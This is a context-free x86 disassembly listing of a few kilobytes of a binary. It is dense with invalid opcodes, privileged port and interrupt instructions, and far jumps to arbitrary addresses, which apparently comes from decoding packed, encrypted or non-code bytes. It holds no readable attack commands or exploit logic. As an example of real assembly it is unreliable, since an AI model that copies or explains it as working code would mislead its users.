  4149d6:	out    dx,eax
  4149d7:	pop    edx
  4149d8:	clc    
  4149d9:	scas   al,BYTE PTR es:[edi]
  4149da:	cld    
  4149db:	stos   DWORD PTR es:[edi],eax
  4149dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149dd:	mov    bl,0x40
  4149df:	lea    edi,[edx]
  4149e1:	xchg   ebx,eax
  4149e2:	(bad)  
  4149e3:	xchg   ecx,eax
  4149e4:	jle    0x414a21
  4149e6:	in     eax,dx
  4149e7:	out    dx,eax
  4149e8:	or     al,0xec
  4149ea:	sbb    eax,0xb8396a61
  4149ef:	sub    esi,eax
  4149f1:	loope  0x414a5c
  4149f3:	inc    ebp
  4149f4:	xchg   ecx,eax
  4149f5:	xchg   esp,eax
  4149f6:	xchg   edi,eax
  4149f7:	popa   
  4149f8:	lods   eax,DWORD PTR ds:[esi]
  4149f9:	fwait
  4149fa:	sbb    BYTE PTR [ecx+0x28],0x82
  4149fe:	mov    BYTE PTR [eax+edi*1-0x5f],dh
  414a02:	ins    DWORD PTR es:[edi],dx
  414a03:	sti    
  414a04:	mov    ch,0x3
  414a06:	fsubr  QWORD PTR [ecx-0x5a8856cd]
  414a0c:	push   ds
  414a0d:	out    0xc2,eax
  414a0f:	jno    0x4149b3
  414a11:	jno    0x414a38
  414a13:	jb     0x414a90
  414a15:	dec    eax
  414a16:	aad    0x83
  414a18:	mov    ebx,ebx
  414a1a:	push   ebx
  414a1b:	frstor [esi]
  414a1d:	inc    esp
  414a1e:	cdq    
  414a1f:	in     eax,0x4a
  414a21:	fdiv   DWORD PTR [edi]
  414a23:	jmp    0xa11a:0x7f231a86
  414a2a:	lds    ebx,FWORD PTR [esp+eiz*4+0x17a23b69]
  414a31:	in     eax,dx
  414a32:	js     0x414a43
  414a34:	es (bad) 
  414a36:	pushf  
  414a37:	mov    bh,0xf4
  414a39:	mov    edx,0xa3b79187
  414a3e:	push   ebp
  414a3f:	outs   dx,DWORD PTR ds:[esi]
  414a40:	mov    WORD PTR [ebp+0x4],ss
  414a43:	jmp    0x34e61d4a
  414a48:	inc    ecx
  414a49:	inc    edi
  414a4a:	push   esp
  414a4b:	jmp    0x4149f6
  414a4d:	dec    esp
  414a4e:	lock popf 
  414a50:	sub    al,0xb9
  414a52:	test   DWORD PTR [eax],edx
  414a54:	mov    DWORD PTR [edx],esp
  414a56:	inc    esi
  414a57:	push   0x22
  414a59:	loope  0x414a0f
  414a5b:	out    0x7c,al
  414a5d:	(bad)  
  414a5e:	mov    ds:0x1b3624a,al
  414a63:	sbb    bh,cl
  414a65:	fwait
  414a66:	out    dx,eax
  414a67:	aaa    
  414a68:	gs hlt 
  414a6a:	pop    ebx
  414a6b:	jmp    0x414a02
  414a6d:	arpl   WORD PTR [eax-0x490bec15],di
  414a73:	pop    edx
  414a74:	and    ch,BYTE PTR [ebx+0x6fb1eef5]
  414a7a:	repnz cmc 
  414a7c:	mov    edx,0xd8ff6c4a
  414a81:	mov    ebp,gs
  414a83:	adc    dl,BYTE PTR [ecx+0x4bd47956]
  414a89:	pop    ebx
  414a8a:	xchg   esp,eax
  414a8b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a8d:	jae    0x414ac5
  414a8f:	xchg   DWORD PTR [esi-0x1710a1ee],esi
  414a95:	iret   
  414a96:	ffree  st(5)
  414a98:	sbb    al,0x70
  414a9a:	sub    BYTE PTR [ebp+0x5751194],bl
  414aa0:	test   eax,0xd218c4da
  414aa5:	jmp    0xc92cfc4b
  414aaa:	push   cs
  414aab:	push   ss
  414aac:	ret    
  414aad:	out    0x79,eax
  414aaf:	xor    ebx,DWORD PTR [edx]
  414ab1:	and    eax,0xbe6bb42a
  414ab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ab7:	dec    edi
  414ab8:	lock aam 0x16
  414abb:	outs   dx,BYTE PTR ds:[esi]
  414abc:	mov    bh,0x9e
  414abe:	cmp    bh,0x24
  414ac1:	jmp    0x26c0:0x43efde14
  414ac8:	aad    0x6f
  414aca:	out    dx,al
  414acb:	ins    BYTE PTR es:[edi],dx
  414acc:	dec    edx
  414acd:	inc    edx
  414ace:	and    ebx,DWORD PTR [edx+0x1d]
  414ad1:	test   eax,0xd2fc0127
  414ad6:	push   ss
  414ad7:	enter  0x2398,0x5d
  414adb:	sub    ch,BYTE PTR [esi-0x7a]
  414ade:	test   al,0x27
  414ae0:	in     eax,dx
  414ae1:	in     eax,dx
  414ae2:	mov    esp,0x64c935aa
  414ae7:	push   esi
  414ae8:	mov    al,0x3f
  414aea:	cmp    al,0xe1
  414aec:	inc    edi
  414aed:	sbb    esi,DWORD PTR [edi-0x6a]
  414af0:	xchg   esi,edx
  414af2:	(bad)  
  414af3:	pop    edi
  414af4:	test   DWORD PTR [ebx-0x21],edx
  414af7:	je     0x414ac9
  414af9:	aad    0x35
  414afb:	faddp  st(0),st
  414afd:	xchg   ebx,eax
  414afe:	ins    DWORD PTR es:[edi],dx
  414aff:	xor    al,0x5d
  414b02:	inc    esp
  414b03:	jnp    0x414b74
  414b05:	dec    edi
  414b06:	adc    eax,0x130999b8
  414b0b:	lods   al,BYTE PTR ds:[esi]
  414b0c:	test   eax,0xebaace03
  414b11:	jno    0x414a9a
  414b13:	adc    al,0xfd
  414b15:	or     dl,bh
  414b17:	xor    eax,0x9bd1bcd0
  414b1c:	int3   
  414b1d:	in     al,dx
  414b1e:	ins    DWORD PTR es:[edi],dx
  414b1f:	push   esp
  414b20:	cmp    DWORD PTR [ebp-0x74],ebp
  414b23:	neg    DWORD PTR [ebp+0x7c116598]
  414b29:	sbb    eax,0xbec88e7
  414b2e:	add    eax,0x28a4b3d4
  414b33:	popa   
  414b34:	mov    ch,0x73
  414b36:	in     eax,dx
  414b37:	mov    ch,0x7e
  414b39:	in     al,dx
  414b3a:	adc    ecx,ebp
  414b3c:	mov    edx,0x3d1c2252
  414b41:	and    eax,0x3050fd91
  414b46:	and    al,0x2c
  414b48:	xlat   BYTE PTR ds:[ebx]
  414b49:	ret    
  414b4a:	ins    DWORD PTR es:[edi],dx
  414b4b:	mov    ebp,0xc62662a3
  414b50:	dec    esp
  414b51:	mov    cl,0xea
  414b53:	xchg   edi,eax
  414b54:	retf   0x7d27
  414b57:	jge    0x414b60
  414b59:	pop    ebx
  414b5a:	icebp  
  414b5b:	fisub  DWORD PTR [edx+0x24f8a21b]
  414b61:	fcmovbe st,st(0)
  414b63:	cmc    
  414b64:	imul   esi,DWORD PTR [edi+0x3aa17d00],0xffffffa8
  414b6b:	xchg   edx,eax
  414b6c:	xchg   esp,eax
  414b6d:	mov    cl,0x58
  414b6f:	in     eax,0x48
  414b71:	and    al,0x1a
  414b73:	mov    dh,0xc0
  414b75:	xchg   esi,eax
  414b76:	dec    eax
  414b77:	pop    es
  414b78:	pop    esp
  414b79:	and    eax,0xdb2ca9b9
  414b7e:	pusha  
  414b7f:	mov    dh,dl
  414b81:	cld    
  414b82:	cdq    
  414b83:	test   BYTE PTR [ebx-0x611f4e55],0x2b
  414b8a:	push   ds
  414b8b:	popa   
  414b8c:	pushf  
  414b8d:	or     al,0xf0
  414b8f:	outs   dx,BYTE PTR ds:[esi]
  414b90:	xchg   ecx,eax
  414b91:	call   0xefcfb38b
  414b96:	jg     0x414b8f
  414b98:	dec    edx
  414b99:	push   ss
  414b9a:	and    eax,0x14c0bd6d
  414b9f:	pop    edi
  414ba0:	ds cli 
  414ba2:	mov    edx,0x9f00f273
  414ba7:	fwait
  414ba8:	pop    ebp
  414ba9:	jl     0x414b8f
  414bab:	adc    BYTE PTR [edx],0x12
  414bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414baf:	ins    BYTE PTR es:[edi],dx
  414bb0:	out    dx,al
  414bb1:	call   0x20ef:0x3e6e17c
  414bb8:	sbb    eax,0x91448d86
  414bbd:	and    al,BYTE PTR [eax+0x8]
  414bc0:	leave  
  414bc1:	mov    dl,al
  414bc3:	nop
  414bc4:	cs adc al,0x14
  414bc7:	pop    ebx
  414bc8:	mov    edx,0x2522cfc7
  414bcd:	sbb    al,0xa6
  414bcf:	(bad)  
  414bd0:	jmp    0x414b90
  414bd2:	xchg   edx,eax
  414bd3:	adc    BYTE PTR [esi+0x29e2f90d],0x18
  414bda:	iret   
  414bdb:	icebp  
  414bdc:	call   0x7b4:0x85bd65c6
  414be3:	loope  0x414c31
  414be5:	add    DWORD PTR [eax+eiz*8],0x2da01ee7
  414bec:	push   edi
  414bed:	(bad)  
  414bef:	mov    ah,0x79
  414bf1:	dec    ebp
  414bf2:	retf   0xc8c7
  414bf5:	iret   
  414bf6:	loopne 0x414bb8
  414bf8:	fst    QWORD PTR [ecx]
  414bfa:	addr16 shl eax,1
  414bfd:	sbb    eax,0x9ca80a8b
  414c02:	xor    dh,BYTE PTR [esi+eax*2]
  414c05:	outs   dx,BYTE PTR ds:[esi]
  414c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c07:	fiadd  WORD PTR [edx]
  414c09:	ss cwde 
  414c0b:	in     eax,0xd0
  414c0d:	out    dx,al
  414c0e:	mov    edi,0x7b1acfa4
  414c13:	sar    BYTE PTR [esi-0x4ff6ee86],1
  414c19:	mov    esp,0x1be61768
  414c1e:	arpl   WORD PTR [ecx],ax
  414c20:	sbb    bh,BYTE PTR [ebx-0x35]
  414c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c24:	push   cx
  414c26:	pop    edi
  414c27:	loopne 0x414c64
  414c29:	popa   
  414c2a:	mov    ch,0xc8
  414c2c:	imul   ebx,DWORD PTR [esi+0x2679f38],0x5cc71fda
  414c36:	and    DWORD PTR [esi],ebx
  414c38:	ins    DWORD PTR es:[edi],dx
  414c39:	mov    bl,0xdc
  414c3b:	jmp    0xd513:0x41267ab8
  414c42:	jle    0x414bc6
  414c44:	pop    ebp
  414c45:	test   al,0x98
  414c47:	neg    BYTE PTR [esi+0x27]
  414c4a:	sbb    BYTE PTR [ebx],cl
  414c4c:	sub    al,0x90
  414c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c4f:	ja     0x414c7f
  414c51:	stos   BYTE PTR es:[edi],al
  414c52:	mov    ds:0xe2023ce1,al
  414c57:	out    0x2e,eax
  414c59:	xchg   DWORD PTR [ebp+ebp*8-0x5c],eax
  414c5d:	mov    cl,0xd
  414c5f:	jmp    0x414cdc
  414c61:	push   eax
  414c62:	dec    ebp
  414c63:	bound  ebp,QWORD PTR [esi-0x794f887c]
  414c69:	aam    0xbe
  414c6b:	ss in  al,dx
  414c6d:	mov    ebp,cs
  414c6f:	push   edx
  414c70:	cmp    BYTE PTR [eax-0x11946dd],ah
  414c76:	mov    ds:0x4fb4f5ff,eax
  414c7b:	and    BYTE PTR [ebx-0x5e],ch
  414c7e:	lods   al,BYTE PTR ds:[esi]
  414c7f:	scas   eax,DWORD PTR es:[edi]
  414c80:	mov    BYTE PTR [ebp+0x3f628589],0x17
  414c87:	test   bl,dh
  414c89:	les    edi,FWORD PTR [edx]
  414c8b:	hlt    
  414c8c:	xchg   edi,eax
  414c8d:	cdq    
  414c8e:	(bad)  
  414c8f:	idiv   dl
  414c91:	adc    esi,DWORD PTR [edx-0x58]
  414c94:	jge    0x414cec
  414c96:	imul   esp,esp,0xffffff83
  414c99:	jp     0x414cf1
  414c9b:	mov    ah,0x97
  414c9d:	aaa    
  414c9e:	mov    ebp,DWORD PTR [ecx+0x17]
  414ca1:	dec    ebx
  414ca2:	adc    cl,BYTE PTR [ebx+0x4b]
  414ca5:	mov    bl,0x10
  414ca7:	cmp    al,0x30
  414ca9:	xor    al,0x57
  414cab:	pop    edi
  414cac:	adc    DWORD PTR [eax],ecx
  414cae:	adc    cl,al
  414cb0:	js     0x414cd2
  414cb2:	retf   0x2a8a
  414cb5:	arpl   ax,sp
  414cb7:	retf   
  414cb8:	adc    DWORD PTR [edx-0x4fe4c69e],edi
  414cbe:	into   
  414cbf:	jg     0x414d38
  414cc1:	mov    al,BYTE PTR [ebp+esi*1+0x3ef96c13]
  414cc8:	xor    ecx,DWORD PTR [edx-0x12]
  414ccb:	retf   
  414ccc:	xor    DWORD PTR [ecx+0xd70413],esp
  414cd2:	mov    BYTE PTR [edx],al
  414cd4:	pushf  
  414cd5:	in     eax,dx
  414cd6:	mov    edi,0xc001d509
  414cdb:	and    DWORD PTR [ecx+ebx*1],ebp
  414cde:	add    al,0x2c
  414ce0:	jnp    0x414c73
  414ce2:	out    dx,eax
  414ce3:	enter  0xd40,0xf5
  414ce7:	push   0xffffffb2
  414ce9:	repz push es
  414ceb:	xor    al,0x8f
  414ced:	pop    ebp
  414cee:	xchg   BYTE PTR [edx],bh
  414cf0:	jecxz  0x414d4e
  414cf2:	bound  esi,QWORD PTR [eax+0x4a0becec]
  414cf8:	push   esp
  414cf9:	mul    DWORD PTR [edi-0x28]
  414cfc:	pusha  
  414cfd:	mov    bh,BYTE PTR [ebx]
  414cff:	outs   dx,DWORD PTR ds:[esi]
  414d00:	icebp  
  414d01:	jae    0x414ce6
  414d03:	jle    0x414d31
  414d05:	adc    ah,dh
  414d07:	xchg   edx,eax
  414d08:	xor    bh,BYTE PTR [ebx-0xaf59b09]
  414d0e:	and    DWORD PTR [ecx],ecx
  414d10:	loope  0x414d79
  414d12:	fld    DWORD PTR ds:0x16d3d4c8
  414d18:	push   cs
  414d19:	pop    ebp
  414d1a:	mov    cs,WORD PTR [edi+0x1af068d6]
  414d20:	enter  0xc674,0x93
  414d24:	fstp   QWORD PTR [ebp-0x4f]
  414d27:	adc    BYTE PTR [ebx],0x17
  414d2a:	rcr    DWORD PTR ss:[edi],1
  414d2d:	(bad)  
  414d2e:	push   esi
  414d2f:	or     DWORD PTR [eax-0x5f],ebp
  414d32:	ror    BYTE PTR [edx],cl
  414d34:	dec    ebx
  414d35:	lds    esi,FWORD PTR ds:0x2661d297
  414d3b:	xor    DWORD PTR [ecx-0x4f],ebx
  414d3e:	sbb    al,0x45
  414d40:	jae    0x414dae
  414d42:	adc    esi,ecx
  414d44:	popf   
  414d45:	xor    eax,0x1bae4aea
  414d4a:	out    dx,al
  414d4b:	xchg   ebp,eax
  414d4c:	pop    edx
  414d4d:	bound  ebx,QWORD PTR [ecx]
  414d4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d50:	pop    ebp
  414d51:	xchg   DWORD PTR [eax],ebp
  414d53:	pop    edi
  414d54:	rol    BYTE PTR [ecx+0x1f],cl
  414d57:	cmp    ecx,0xa3e22f97
  414d5d:	add    cl,BYTE PTR [esp+edi*4]
  414d60:	mov    esi,0x5f6c9deb
  414d65:	sbb    edx,DWORD PTR [ecx+0x73]
  414d68:	scas   eax,DWORD PTR es:[edi]
  414d69:	push   esi
  414d6a:	or     al,dl
  414d6c:	(bad)  
  414d6d:	fisttp QWORD PTR [ecx]
  414d6f:	nop
  414d70:	out    0x80,al
  414d72:	jge    0x414d2c
  414d74:	int    0xd7
  414d76:	push   es
  414d77:	push   0xb2fc814b
  414d7c:	bound  edx,QWORD PTR [edx+0x4d]
  414d7f:	dec    esp
  414d80:	push   cs
  414d81:	icebp  
  414d82:	jns    0x414d8e
  414d84:	leave  
  414d85:	cmp    al,0xff
  414d87:	ins    BYTE PTR es:[edi],dx
  414d88:	popf   
  414d89:	push   cs
  414d8a:	xchg   ebp,eax
  414d8b:	ror    al,cl
  414d8d:	mov    esi,0x522df43d
  414d92:	enter  0xebc8,0x30
  414d96:	adc    eax,0xfd1bc1ea
  414d9b:	(bad)  
  414d9c:	(bad)  
  414d9d:	push   eax
  414d9e:	cmp    eax,0x5d1772e7
  414da3:	sahf   
  414da4:	and    BYTE PTR [ebx],al
  414da6:	repz mov ?,WORD PTR [ecx+ebx*2]
  414daa:	mov    ds:0x56cada75,eax
  414daf:	pop    es
  414db0:	pop    ds
  414db1:	pop    ecx
  414db2:	lods   eax,DWORD PTR ds:[esi]
  414db3:	xor    DWORD PTR [edi],edx
  414db5:	je     0x414d4d
  414db7:	mov    al,ds:0x3c9c954e
  414dbc:	sbb    esi,eax
  414dbe:	xor    eax,0x3de06c68
  414dc3:	std    
  414dc4:	mov    bl,0xd2
  414dc6:	fst    QWORD PTR [eax]
  414dc8:	adc    al,0xe6
  414dca:	and    al,0x67
  414dcc:	jns    0x414d7f
  414dce:	sub    eax,0x2e278cc3
  414dd3:	test   edx,ebx
  414dd5:	pop    edx
  414dd6:	fnstsw WORD PTR [ebx+0x5dd927e5]
  414ddc:	mov    WORD PTR [ebx-0x54],ds
  414ddf:	push   edx
  414de0:	jns    0x414da1
  414de2:	pop    ss
  414de3:	out    0x9f,eax
  414de5:	push   es
  414de6:	daa    
  414de7:	mov    al,0xc2
  414de9:	into   
  414dea:	pop    ebp
  414deb:	pop    ebx
  414dec:	cmp    ebp,DWORD PTR [ebx+0x4f749028]
  414df2:	jmp    0x70dc7833
  414df7:	mov    ch,BYTE PTR [esi-0xb]
  414dfa:	lock in al,dx
  414dfc:	jp     0x414e6e
  414dfe:	push   edi
  414dff:	or     eax,0xc381618e
  414e04:	lea    ebp,[eax]
  414e06:	xchg   edx,eax
  414e07:	loopne 0x414e4b
  414e09:	arpl   WORD PTR [edi+0x8a3fa88],si
  414e0f:	ins    BYTE PTR es:[edi],dx
  414e10:	repnz push edi
  414e12:	std    
  414e13:	leave  
  414e14:	mov    eax,0xc4f4692
  414e19:	std    
  414e1a:	pop    ss
  414e1b:	aam    0x8e
  414e1d:	or     eax,0x30eabfd5
  414e22:	loopne 0x414e1c
  414e24:	clc    
  414e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e26:	enter  0x6e63,0xee
  414e2a:	sti    
  414e2b:	call   0xac53b02f
  414e30:	push   esp
  414e31:	sbb    bh,BYTE PTR [ebp+0x2cd2e23d]
  414e37:	or     eax,0xbda84605
  414e3c:	or     cl,cl
  414e3e:	jp     0x414e99
  414e40:	mov    ds:0xe902181c,eax
  414e45:	mov    ecx,0x345b448c
  414e4a:	push   edx
  414e4b:	loop   0x414de8
  414e4d:	sub    al,0xb5
  414e4f:	cmp    esi,ecx
  414e51:	sar    al,1
  414e53:	outs   dx,DWORD PTR ds:[esi]
  414e54:	sbb    bh,BYTE PTR [edx]
  414e56:	inc    ebp
  414e57:	push   ebx
  414e58:	mov    cl,0x4d
  414e5a:	in     al,dx
  414e5b:	lock adc WORD PTR ds:0xe992f2df,bx
  414e63:	daa    
  414e64:	sbb    DWORD PTR fs:[edx-0x495a03fc],0xffffffe4
  414e6c:	xchg   edi,eax
  414e6d:	mov    dh,0xd
  414e6f:	xor    DWORD PTR [ebx],edx
  414e71:	add    eax,0xa341be65
  414e76:	cld    
  414e77:	nop
  414e78:	sbb    ebx,esp
  414e7a:	call   0xebbc4f26
  414e7f:	push   ds
  414e80:	lahf   
  414e81:	rol    DWORD PTR [esi],cl
  414e83:	cmp    al,0x2b
  414e85:	js     0x414ed5
  414e87:	imul   esp,DWORD PTR [eax+0x4e],0x8fa3639f
  414e8e:	repz sbb bl,BYTE PTR [ebx+edi*4]
  414e92:	jo     0x414e9b
  414e94:	popa   
  414e95:	xor    edx,DWORD PTR [edi+0xe]
  414e98:	ret    0x122
  414e9b:	adc    eax,0xdaef3548
  414ea0:	test   al,0xa2
  414ea2:	das    
  414ea3:	js     0x414eed
  414ea5:	sub    dh,al
  414ea7:	lds    esp,FWORD PTR [esi+0x36fe4385]
  414ead:	adc    al,0x61
  414eaf:	and    eax,0xffb3f52f
  414eb4:	test   eax,0x29d9b73e
  414eb9:	retf   
  414eba:	add    eax,0x90d901c1
  414ebf:	repnz test DWORD PTR [eax-0x6ae77d06],esp
  414ec6:	sub    cl,ah
  414ec8:	xlat   BYTE PTR ds:[ebx]
  414ec9:	push   ss
  414eca:	fnstcw WORD PTR [ebx+0x61ab6ef3]
  414ed0:	adc    BYTE PTR [bp+di+0x1fbf],ch
  414ed5:	std    
  414ed6:	addr16 sahf 
  414ed8:	pop    es
  414ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eda:	ds scas eax,DWORD PTR es:[edi]
  414edc:	xchg   edx,edi
  414ede:	cmc    
  414edf:	ins    BYTE PTR es:[edi],dx
  414ee0:	in     eax,dx
  414ee1:	call   0x8dc2:0x7f73529c
  414ee8:	pop    edi
  414ee9:	cmp    ecx,DWORD PTR [ecx+eiz*4+0x4c]
  414eed:	sub    al,cl
  414eef:	jl     0x414e85
  414ef1:	gs fdivr st(0),st
  414ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ef5:	cli    
  414ef6:	fsubr  st,st(7)
  414ef8:	mov    bh,0x62
  414efa:	(bad)
  414efe:	inc    ecx
  414eff:	cmp    BYTE PTR [eax-0x7b889068],cl
  414f05:	jecxz  0x414ec6
  414f07:	push   0xffffffc1
  414f09:	aam    0x1e
  414f0b:	(bad)  [ecx-0x7fe02ef6]
  414f11:	jnp    0x414efe
  414f13:	pop    ss
  414f14:	stc    
  414f15:	mov    edx,0x3155d904
  414f1a:	leave  
  414f1b:	push   ecx
  414f1c:	jns    0x414f84
  414f1e:	(bad)  
  414f1f:	fsub   DWORD PTR [eax-0x3]
  414f22:	imul   edx,ebx,0x5c
  414f25:	mov    bh,0xc9
  414f27:	mul    DWORD PTR [eax]
  414f29:	loope  0x414f14
  414f2b:	leave  
  414f2c:	iret   
  414f2d:	repnz sub eax,DWORD PTR [edx-0x23]
  414f31:	adc    eax,0xe9d1f4c0
  414f36:	push   esi
  414f37:	lds    esi,FWORD PTR [esi]
  414f39:	fbstp  TBYTE PTR ds:0xa02ccb4b
  414f3f:	jo     0x414eee
  414f41:	repnz pop edx
  414f43:	pop    es
  414f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f45:	mov    ecx,0xe4f8f61d
  414f4a:	cwde   
  414f4b:	fldenv [ecx-0x5df226c8]
  414f51:	xor    dh,BYTE PTR [eax]
  414f53:	rol    esi,1
  414f55:	xor    bh,BYTE PTR [eax]
  414f57:	mov    bl,0x80
  414f59:	cmp    edx,DWORD PTR [ebp+edx*4+0x6dcd298d]
  414f60:	cli    
  414f61:	adc    al,0x7
  414f63:	or     DWORD PTR [edi+0x330b14f0],0xd790fcbe
  414f6d:	jno    0x414f46
  414f6f:	test   BYTE PTR [ebx+0x1bed5617],0x84
  414f76:	and    BYTE PTR [edx+edi*2-0x11],0x8f
  414f7b:	clc    
  414f7c:	xchg   esp,eax
  414f7d:	jbe    0x414f87
  414f7f:	inc    esi
  414f80:	clc    
  414f81:	jmp    0xd53d:0xdfa34a08
  414f88:	sti    
  414f89:	das    
  414f8a:	xchg   ebx,eax
  414f8b:	mov    ds:0x134cacd1,al
  414f90:	fstp   DWORD PTR [eax+0x7898c01]
  414f96:	hlt    
  414f97:	jmp    0x3760:0xd715e11f
  414f9e:	dec    esp
  414f9f:	(bad)  
  414fa0:	cld    
  414fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fa2:	mov    eax,0xb2ce9647
  414fa7:	jg     0x415002
  414fa9:	hlt    
  414faa:	or     dl,ch
  414fac:	call   0x7fdca824
  414fb1:	push   cs
  414fb2:	and    ch,al
  414fb4:	mov    ch,0x34
  414fb6:	stos   DWORD PTR es:[edi],eax
  414fb7:	inc    ebp
  414fb8:	retf   
  414fb9:	pop    ebx
  414fba:	je     0x414ff8
  414fbc:	enter  0x33b2,0xaa
  414fc0:	enter  0x77c0,0x6c
  414fc4:	ds jecxz 0x414ffe
  414fc7:	fdivr  DWORD PTR [edx]
  414fc9:	xor    eax,esi
  414fcb:	out    dx,eax
  414fcc:	sub    BYTE PTR [ebp-0x7a],cl
  414fcf:	mov    eax,0x58eb323e
  414fd4:	adc    al,0x4
  414fd6:	or     DWORD PTR [esi+0x35],esi
  414fd9:	stos   DWORD PTR es:[edi],eax
  414fda:	out    dx,al
  414fdb:	sub    dh,BYTE PTR [ebp+esi*4+0x1e]
  414fdf:	int3   
  414fe0:	jmp    0xd6374527
  414fe5:	test   al,0x2
  414fe7:	loopne 0x414ffb
  414fe9:	mov    bh,0x41
  414feb:	mov    fs,WORD PTR [ebp+edx*2-0x33]
  414fef:	jecxz  0x414fca
  414ff1:	jge    0x41504b
  414ff3:	in     eax,0x6c
  414ff5:	xlat   BYTE PTR gs:[ebx]
  414ff7:	daa    
  414ff8:	call   0xa070083
  414ffd:	xchg   ebp,ecx
  414fff:	stos   BYTE PTR es:[edi],al
  415000:	leave  
  415001:	mul    ah
  415003:	or     ebp,eax
  415005:	pusha  
  415006:	test   DWORD PTR [ebp+0x67],ebp
  415009:	mov    eax,0x77d599a7
  41500e:	and    al,0x19
  415010:	je     0x415077
  415012:	dec    edx
  415013:	inc    esp
  415014:	pop    esp
  415015:	loop   0x414f9c
  415017:	inc    edx
  415018:	mov    edi,0x6d4f68c2
  41501d:	out    0xff,eax
  41501f:	mov    dh,0x20
  415021:	fs pop ss
  415023:	xlat   BYTE PTR ds:[ebx]
  415024:	or     al,0x94
  415026:	cdq    
  415027:	sub    bh,bl
  415029:	xchg   ecx,eax
  41502a:	or     ecx,DWORD PTR [ecx]
  41502c:	pop    esi
  41502d:	rcr    DWORD PTR [edi-0x1],0xe9
  415031:	sahf   
  415032:	jne    0x4150a3
  415034:	fcmovbe st,st(6)
  415036:	jne    0x415020
  415038:	dec    esp
  415039:	cmp    BYTE PTR [ebp-0x76],0x70
  41503d:	xchg   edi,eax
  41503e:	cs jne 0x41508d
  415041:	add    eax,0xbe2a264b
  415046:	lods   al,BYTE PTR fs:[esi]
  415048:	outs   dx,BYTE PTR ds:[esi]
  415049:	loop   0x41504e
  41504b:	sbb    DWORD PTR [esi-0x244e3dfe],ecx
  415051:	pop    ds
  415052:	pop    esp
  415053:	jbe    0x415062
  415055:	adc    ah,ch
  415057:	sub    BYTE PTR [edi+0x1],bh
  41505a:	imul   esp,DWORD PTR [esi-0x11],0x34
  41505e:	inc    ebx
  41505f:	mov    esp,0x261e353c
  415064:	je     0x41508e
  415066:	jmp    0x415098
  415068:	ret    
  415069:	dec    ecx
  41506a:	xchg   esi,eax
  41506b:	sub    bh,bl
  41506d:	rcr    bl,0x1a
  415070:	sub    DWORD PTR [edi-0x3a],esi
  415073:	sbb    eax,0x2fc38749
  415078:	mov    cl,0x4
  41507a:	xchg   BYTE PTR [esp+ecx*2-0x72b637d3],bl
  415081:	arpl   WORD PTR [ecx-0x2ac18acc],di
  415087:	dec    edi
  415088:	adc    ecx,0xf8d20cac
  41508e:	add    DWORD PTR [esi-0x46908b0d],0xfffffff2
  415095:	es inc esi
  415097:	repz jns 0x41510e
  41509a:	aam    0x61
  41509c:	in     eax,dx
  41509d:	jne    0x4150c6
  41509f:	test   al,0xf3
  4150a1:	mov    al,ds:0x417f47da
  4150a6:	push   DWORD PTR [edi-0x5e]
  4150a9:	mov    ah,0xe4
  4150ab:	(bad)  [eax]
  4150ad:	jle    0x41503a
  4150af:	dec    edi
  4150b0:	loopne 0x4150ad
  4150b2:	pop    edi
  4150b3:	mov    ch,0xcf
  4150b5:	ret    0x6d14
  4150b8:	mov    ecx,0x40c658a5
  4150bd:	xchg   esp,eax
  4150be:	jecxz  0x415112
  4150c0:	push   ss
  4150c1:	cmp    eax,0xa6ab32ca
  4150c6:	pop    esp
  4150c7:	mov    ecx,0x4c4c06a2
  4150cc:	inc    ebx
  4150cd:	adc    esi,esi
  4150cf:	inc    ebp
  4150d0:	mov    ebp,0x10932984
  4150d5:	xchg   ebx,eax
  4150d6:	fcom   DWORD PTR [esp+edx*8-0x7]
  4150da:	xor    BYTE PTR [ecx],dh
  4150dc:	ret    
  4150dd:	mov    cl,bl
  4150df:	js     0x41509e
  4150e1:	push   ebp
  4150e2:	cmc    
  4150e3:	je     0x4150a2
  4150e5:	mov    eax,0xb727c1f0
  4150ea:	sbb    ch,BYTE PTR [ebx+esi*1]
  4150ed:	jb     0x4150fa
  4150ef:	jae    0x41515d
  4150f1:	sbb    al,0x2f
  4150f3:	jb     0x415173
  4150f5:	push   ebp
  4150f6:	lock outs dx,BYTE PTR ds:[esi]
  4150f8:	sbb    eax,0xad138652
  4150fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150fe:	adc    dl,dh
  415100:	jg     0x415164
  415102:	adc    eax,0x585185a6
  415107:	xchg   edi,eax
  415108:	cld    
  415109:	pop    ebx
  41510a:	(bad)  
  41510b:	sbb    al,0x3b
  41510d:	cmp    al,0x50
  41510f:	cmp    ah,BYTE PTR [ebx+0xb]
  415112:	scas   eax,DWORD PTR es:[edi]
  415113:	cmp    BYTE PTR [edx+0x38],ch
  415116:	stc    
  415117:	mov    al,0x1b
  415119:	or     ebp,eax
  41511b:	jbe    0x41509e
  41511d:	xchg   esp,eax
  41511e:	jo     0x4150df
  415120:	push   edx
  415121:	pusha  
  415122:	xor    al,0x16
  415124:	out    0xdf,al
  415126:	push   0xffffff84
  415128:	adc    al,0xf0
  41512a:	loopne 0x4150ec
  41512c:	xor    DWORD PTR ds:0x65b16331,edi
  415132:	push   0xc903d6c2
  415137:	jnp    0x415115
  415139:	or     DWORD PTR [edx],ecx
  41513b:	mov    cl,0x7c
  41513d:	jmp    0x415188
  41513f:	xor    dh,al
  415141:	imul   edi,DWORD PTR [edx],0xffffffc7
  415144:	xor    bh,BYTE PTR [eax]
  415146:	cmp    dl,BYTE PTR [ecx]
  415148:	sub    ah,ah
  41514a:	es dec ebp
  41514c:	lea    ebp,[eax-0x51]
  41514f:	mov    edx,0xe407ca42
  415154:	jp     0x41513e
  415156:	pop    ecx
  415157:	add    ch,BYTE PTR [edx+ebx*8-0x24]
  41515b:	mov    cl,0x54
